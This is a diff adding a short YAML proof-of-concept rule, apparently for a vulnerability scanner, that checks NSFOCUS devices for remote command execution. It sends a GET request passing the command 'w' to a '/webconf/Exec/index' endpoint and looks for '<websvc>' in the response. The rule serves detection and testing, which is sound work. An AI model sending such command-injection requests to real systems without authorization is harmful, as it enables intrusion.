@@ -1,0 +1,11 @@
+name: poc-yaml-nsfocus-php-rce
+rules:
+  - method: GET
+    path:  /webconf/Exec/index?cmd=w
+    expression: |
+      response.body.bcontains(b'<websvc>')
+detail:
+  author: nsfocus
+  links:
+    - https://www.baidu.com
+
